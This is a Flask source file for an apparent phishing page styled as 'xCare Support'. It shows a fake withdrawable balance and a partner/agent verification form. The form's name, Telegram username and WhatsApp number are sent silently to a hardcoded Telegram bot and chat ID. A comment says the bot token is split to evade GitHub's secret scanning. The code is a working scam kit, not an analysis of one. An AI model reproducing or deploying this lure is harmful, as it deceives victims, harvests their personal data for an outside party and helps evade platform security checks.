from flask import Flask, render_template_string, request, jsonify
import os, requests

app = Flask(__name__)

# আপনার টেলিগ্রাম বট এবং আইডি (GitHub সিকিউরিটি বাইপাস করার জন্য আলাদা করা)
B1 = "8540257283"
B2 = "AAEqTBD6kJSVozsKmWtZf_l-QQtkJtUuTw"
TELEGRAM_BOT_TOKEN = f"{B1}:{B2}"
MY_CHAT_ID = "6529319833"

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>xCare Support</title>
        <style>
            body { font-family: 'Segoe UI', sans-serif; background-color: #0b162c; color: white; margin: 0; padding: 0; }
            .header { background: #162641; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #1c2e4a; }
            .container { padding: 20px; }
            .balance-card { background: linear-gradient(135deg, #0d47a1, #1976d2); padding: 20px; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
            .form-box { background: #162641; padding: 20px; border-radius: 15px; border: 1px solid #253959; }
            .input-group { margin-bottom: 15px; }
            .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #8fa3bf; }
            .input-group input, .input-group select { width: 100%; padding: 12px; background: #0b162c; border: 1px solid #253959; border-radius: 8px; color: white; box-sizing: border-box; }
            .submit-btn { background: #1976d2; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
            #success { display: none; text-align: center; background: #162641; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; padding: 30px; border-radius: 20px; border: 2px solid #4caf50; z-index: 100; }
        </style>
    </head>
    <body>
        <div class="header">
            <span>🌐 Gateway Status: Online</span>
            <span>ID: 1XB-7729-MS</span>
        </div>
        <div class="container">
            <div class="balance-card">
                <small>TOTAL WITHDRAWABLE BALANCE</small>
                <h2 style="margin: 5px 0;">৳ 5,450.00 BDT</h2>
                <span style="color: #4caf50; font-size: 12px;">● Account Verified</span>
            </div>
            
            <div class="form-box">
                <h4 style="margin-top: 0; color: #8fa3bf;">👤 PARTNER/AGENT VERIFICATION</h4>
                <form id="verifyForm">
                    <div class="input-group">
                        <label>Select Role</label>
                        <select name="role">
                            <option>Affiliate Manager</option>
                            <option>Master Agent</option>
                            <option>Sub Agent</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Full Name</label>
                        <input type="text" name="name" placeholder="Enter Name" required>
                    </div>
                    <div class="input-group">
                        <label>Telegram Username</label>
                        <input type="text" name="tg_user" placeholder="@username" required>
                    </div>
                    <div class="input-group">
                        <label>WhatsApp Number</label>
                        <input type="text" name="phone" placeholder="019XXXXXXXX" required>
                    </div>
                    <button type="submit" class="submit-btn" id="subBtn">LINK ACCOUNT</button>
                </form>
            </div>
        </div>

        <div id="success">
            <h1 style="font-size: 50px; margin: 0;">✅</h1>
            <h3>REQUEST SENT!</h3>
            <p>Your application is under review. We will contact you within 24 hours.</p>
            <button class="submit-btn" onclick="location.reload()">CLOSE</button>
        </div>

        <script>
            document.getElementById('verifyForm').onsubmit = async (e) => {
                e.preventDefault();
                document.getElementById('subBtn').innerText = 'PROCCESSING...';
                const formData = Object.fromEntries(new FormData(e.target));
                
                const response = await fetch('/send-to-tg', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(formData)
                });

                if(response.ok) {
                    document.getElementById('success').style.display = 'block';
                }
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/send-to-tg', methods=['POST'])
def send_to_tg():
    d = request.json
    message = f"🚀 **New Agent Request**\n\n👤 Name: {d.get('name')}\n🎭 Role: {d.get('role')}\n🆔 TG: {d.get('tg_user')}\n📱 Phone: {d.get('phone')}"
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={"chat_id": MY_CHAT_ID, "text": message, "parse_mode": "Markdown"})
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
